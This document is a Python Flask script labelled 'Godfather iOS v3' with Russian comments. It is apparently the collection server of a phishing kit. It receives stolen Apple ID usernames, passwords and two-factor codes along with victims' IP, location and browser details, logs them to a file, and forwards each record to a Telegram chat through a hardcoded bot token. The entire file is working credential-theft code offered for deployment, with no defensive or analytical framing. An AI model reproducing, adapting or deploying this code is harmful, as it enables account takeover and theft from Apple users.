# exfil.py - Godfather iOS v3 (Render.com ready)
from flask import Flask, request, jsonify
import json
import datetime
import requests
import os

app = Flask(__name__)

# Папка для логов (Render монтирует /data только в платных планах, используем текущую)
LOG_FILE = 'logs.txt'

@app.route('/exfil', methods=['POST'])
def exfil_data():
    try:
        data = request.get_json(force=True)
        if not data:
            return jsonify({'status': 'error', 'msg': 'no json'}), 400

        log_entry = {
            'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'type': data.get('type', 'unknown'),
            'apple_id': data.get('data', {}).get('appleId', ''),
            'password': data.get('data', {}).get('password', ''),
            '2fa': data.get('data', {}).get('code', ''),
            'ip': data.get('fp', {}).get('ip', request.remote_addr or 'unknown'),
            'geo': data.get('fp', {}).get('geo', 'unknown'),
            'ua': data.get('fp', {}).get('ua', request.headers.get('User-Agent', 'unknown')),
            'url': data.get('url', ''),
            'referrer': data.get('referrer', '')
        }

        # 1. Запись в файл
        log_line = " | ".join(f"{v}" for v in log_entry.values()) + "\n"
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_line)
        except Exception as e:
            print(f"Ошибка записи в файл: {e}")

        # 2. Отправка в Telegram
        send_telegram_alert(log_entry)

        return jsonify({'status': 'ok'}), 200

    except Exception as e:
        print(f"Ошибка обработки: {e}")
        return jsonify({'status': 'error'}), 500


def send_telegram_alert(d):
    try:
        BOT_TOKEN = '8532033730:AAEWrbOvWTAIIIzcr4bjzEmXGFNR2S-9qVw'
        CHAT_ID = '7739607647'

        message = (
            f"Godfather iOS v3\n\n"
            f"Тип: {d['type']}\n"
            f"Apple ID: <code>{d['apple_id']}</code>\n"
            f"Пароль: <code>{d['password'] or '—'}</code>\n"
            f"2FA: <code>{d['2fa'] or '—'}</code>\n"
            f"IP: {d['ip']} ({d['geo']})\n"
            f"Время: {d['timestamp']}"
        )

        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'},
            timeout=10
        )
    except Exception as e:
        print(f"Telegram error: {e}")


# Ничего не запускаем локально — gunicorn сделает это сам
# if __name__ == '__main__' — убираем полностью
